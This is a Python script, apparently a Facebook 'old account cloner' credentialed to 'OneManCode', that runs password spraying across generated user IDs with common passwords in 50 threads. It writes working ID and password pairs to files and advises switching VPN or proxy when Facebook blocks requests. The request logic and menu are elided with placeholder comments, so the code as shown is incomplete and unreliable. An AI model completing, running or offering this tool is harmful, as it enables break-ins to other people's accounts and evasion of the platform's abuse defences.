[file name] chak.py
[file content begin]
import os,sys,json,uuid,string,random,requests
from concurrent.futures import ThreadPoolExecutor
import requests
import bs4
import json
import os
import sys
import uuid
import random
import datetime
import time
import re
import httpx
import urllib3
import rich
import base64 
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# ... (keep all previous imports as they are)

class OneManCode_CLONER:
    def __init__(self):
        self.loop = 0 
        self.oks = []
        self.cps = []
        self.gen = []
        self.blocked_requests = 0
        self.total_attempts = 0
    
    def banner(self):
        os.system("clear")
        print("\033[1;32m╔══╗─────╔╗──╔╗──────╔╗")
        print("\033[1;32m║╔╗║─────║║──║║──────║║")
        print("\033[1;32m║╚╝║╔══╗║║╔╗║║╔══╗╔═╝║")
        print("\033[1;32m║╔═╝║╔╗║║╚╝╝║║║╔╗║║╔╗║")
        print("\033[1;32m║║──║╚╝║║╔╗╔╣╚╣╚╝║║╚╝║")
        print("\033[1;32m╚╝──╚══╝╚╝╚╝╚═╩══╝╚══╝")
        print("\033[1;37m─────────────────────────────────")
        print("\033[1;33m[+] \033[1;35mAUTHOR  : OneManCode")
        print("\033[1;33m[+] \033[1;35mTELEGRAM: t.me/blackprogrammer")
        print("\033[1;33m[+] \033[1;35mVERSION : Premium OLD CRACK")
        print("\033[1;37m─────────────────────────────────")
    
    def debug_stats(self):
        print(f"\n\033[1;35m[DEBUG STATS]")
        print(f"Total Attempts: {self.total_attempts}")
        print(f"Blocked Requests: {self.blocked_requests}")
        print(f"OK Accounts: {len(self.oks)}")
        print(f"CP Accounts: {len(self.cps)}")
        print("\033[1;37m─────────────────────────────────")

    def main(self):
        self.banner()
        # ... (keep existing menu logic the same)
    
    def oldClone(self,series):
        # ... (keep existing series selection logic)
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            self.banner()
            print(" \033[1;32m [\033[1;37m√\033[1;32m] \033[1;37m TOTAL IDS \033[1;32m - "+str(len(self.gen)))
            print(" \033[1;32m [\033[1;37m√\033[1;32m]  \033[1;37mUID SERIES \033[1;32m - "+series)
            print(" \033[1;31m [!] If blocked switch VPN/Proxy!")
            print("\033[1;37m─────────────────────────────────")
            
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "12345678", "123456789", "123123","112233", "1234567890", "password", "@@@###"]
                executor.submit(self.CloneOld,ids,passlist)
                
            while True:
                try:
                    time.sleep(10)
                    self.debug_stats()
                except KeyboardInterrupt:
                    sys.exit("\n\033[1;31m[!] Process interrupted by user")
        
        sys.exit("\n\033[1;37m─────────────────────────────────")

    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[m [OneManCode] {self.loop} | OK:{len(self.oks)} | BLOCKED:{self.blocked_requests}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                self.total_attempts += 1
                # ... (keep existing request logic)
                
                response = requests.post(url,data=data,headers=head,verify=True).json()
                
                # Debug response handling
                if "access_token" in response:
                    print(f"\r\r\033[38;5;46m[OK] {ids} | {pas}")
                    open("/sdcard/OneManCode-OK.txt","a").write(f"{ids}|{pas}\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r\033[38;5;184m[CP] {ids} | {pas}")
                    open("/sdcard/OneManCode-CP.txt","a").write(f"{ids}|{pas}\n")
                    self.cps.append(ids)
                    break
                elif "request blocked" in str(response).lower():
                    self.blocked_requests += 1
                    print(f"\r\r\033[1;31m[BLOCKED] Detected Facebook block! Change VPN/Proxy")
                    break
                else:
                    continue
                    
            self.loop += 1
            
        except Exception as e:
            # Error resilience
            if "ConnectionError" in str(e):
                self.blocked_requests += 1
            elif "ProxyError" in str(e):
                self.blocked_requests += 1
            return

if __name__ == "__main__":
    OneManCode_CLONER().main()
[file content end]
